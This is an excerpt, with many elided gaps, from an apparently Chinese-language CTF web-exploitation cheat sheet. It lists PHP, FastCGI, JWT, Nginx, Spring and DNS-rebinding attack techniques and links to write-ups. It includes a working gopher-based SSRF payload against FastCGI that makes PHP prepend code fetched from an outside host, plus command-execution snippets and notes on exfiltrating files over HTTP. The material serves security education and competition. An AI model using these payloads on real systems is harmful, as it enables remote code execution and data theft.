...
- Example
    - [0CTF 2018 Qual - EzDoor](https://github.com/duckstroms/CTF/tree/master/0ctf2018_qual/EzDoor)
...
- Fastcgi
    - [link](https://github.com/duckstroms/CTF/tree/master/0ctf2019_qual/WallbreakerEasy)
...
- [FastCGI Extension](https://github.com/duckstroms/FuckFastcgi)
...
- PHP SplDoublyLinkedList UAF Sandbox Escape
    ...
    - Example
        - [RealWorld CTF 3rd - MoP2021](https://github.com/duckstroms/CTF/tree/master/RealWorldCTF2021/MoP2021)
...
- openssl_verify
    ...
    - e.g. [DEFCON CTF 2018 Qual - EasyPisy](https://github.com/duckstroms/CTF/tree/master/defcon2018-qual/EasyPisy)
- Namespace
    - PHP的預設Global space是`\`
    - e.g. `\system('ls');`
...
- basename (php bug 62119)
    - `basename("index.php/config.php/喵")`
        - `config.php`
    - Example: [zer0pts CTF 2020 - Can you guess it?](https://github.com/duckstroms/CTF/tree/master/zer0pts2020/can_you_guess_it)

- strip_tags (php bug 78814)
    - php version <= 7.4.0
    - `strip_tags("<s/trong>b</strong>", "<strong>")`
        - `<s/trong>b</strong>`
    - Example: [zer0pts CTF 2020 - MusicBlog](https://github.com/duckstroms/CTF/tree/master/zer0pts2020/MusicBlog)
...
- `system("ls")`
- `eval("ruby code")`
    - Non-Alphanumeric example: [HITCON CTF 2015 - Hard to say](https://github.com/duckstroms/CTF/tree/master/hitcon2015/hard-to-say)
        - `$$/$$` => 1
        - `'' << 97 << 98 << 99` => "abc"
        - `$:`即`$LOAD_PATH`
- `exec("ls")`
...
- innodb
    ...
    - Example: [Codegate2018 prequal - simpleCMS](https://github.com/duckstroms/CTF/tree/master/codegate2018-prequal/simpleCMS)
...
- 其他
    ...
    - `[]` 神奇用法
        ...
        - [zer0pts CTF 2020 - phpNantokaAdmin](https://github.com/duckstroms/CTF/tree/master/zer0pts2020/phpNantokaAdmin)
...
- Fast Destruct
    ...
    - Example
        - [Balsn CTF 2020 - L5D](https://github.com/duckstroms/My-CTF-Challenges/tree/master/Balsn-CTF-2020#l5d)
...
- Example
    ...
    - [TrendMicro CTF 2019 Qual - Forensics 300](https://github.com/duckstroms/CTF/tree/master/trendmicro-ctf-2019/forensics300)
...
- Example
    - [WCTF 2020 - thymeleaf](https://github.com/duckstroms/CTF/tree/master/wctf2020/thymeleaf)
...
- Libreoffice CVE-2018-6871
    ...
    - 讀出來可以用http往外傳
        ...
        - e.g. DCTF 2018 final, [FBCTF 2019](https://github.com/duckstroms/CTF/blob/master/fbctf2019/pdfme/README_en.md)
    - Example Payload: [Link](https://github.com/duckstroms/CTF/blob/master/fbctf2019/pdfme/flag.fods)
...
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
    ...
    - Tomcat
        ...
        - e.g. [CTFZone 2019 qual - Catcontrol](https://github.com/duckstroms/CTF/tree/master/CTFZone-2019-qual/Catcontrol)
...
- Example: [MidnightSun CTF - Rubenscube](https://github.com/duckstroms/CTF/tree/master/midnightsun2019/Rubenscube)
...
- Example: [Google CTF 2019 Qual - bnv](https://github.com/duckstroms/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)
...
- Example:
    ...
    - ...
    - [SECCON CTF 2018 - GhostKingdom](https://github.com/duckstroms/CTF/tree/master/seccon2018-qual/GhostKingdom)
...
- 用 `window.frames.length` 來判斷
    ...
    - 狀態B => frame count = y
    - x != y
- e.g. [Facebook CTF - Secret Note Keeper](https://github.com/duckstroms/CTF/tree/master/fbctf2019/secret_note_keeper)
    - 找到結果 => frame count >= 1
    - 沒找到 => frame count = 0
...
- JWT (Json Web Token)
    ...
    - jku
        ...
        - 如果未限制的話，攻擊者可以指定自己的密鑰文件，用它來驗證token
            - Example: [VolgaCTF 2021 Qual - JWT](https://github.com/duckstroms/CTF/tree/master/volgactf2021_quals/JWT)
    - 敏感訊息洩漏
        - JWT 是保證完整性而不是保證機密性
        - base64 decode 後即可得到 payload 內容
        - Example
            - [CSAW CTF 2018 Qual - SSO](https://github.com/duckstroms/CTF/blob/47fe34112401d123b2b53ee12058e7ec72888e0e/csaw_2018_qual/sso/README.md)
...
- Nginx $url CRLF Injection
    - `$uri` 是解碼後的請求路徑，可能包含換行，有機會導致CRLF Injection
        - 應改用 `$request_uri`
    - Example: [VolgaCTF 2021 - Static Site](https://github.com/duckstroms/CTF/tree/master/volgactf2021_quals/Static_Site)
...
- AutoBinding / Mass Assignment
    ...
    - Spring MVC
        ...
        - Example 3: [VolgaCTF 2019 - shop](https://github.com/duckstroms/CTF/tree/master/volgactf2019_quals/shop)
...
- DNS rebinding
  ...
  - Example
      - [BalsnCTF 2019 - 卍乂Oo韓國魚oO乂卍](https://github.com/duckstroms/My-CTF-Challenges/tree/master/Balsn-CTF-2019#%E5%8D%8D%E4%B9%82oo%E9%9F%93%E5%9C%8B%E9%AD%9Aoo%E4%B9%82%E5%8D%8D-koreanfish)
...
[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://ko-fi.com/duckoverflow)
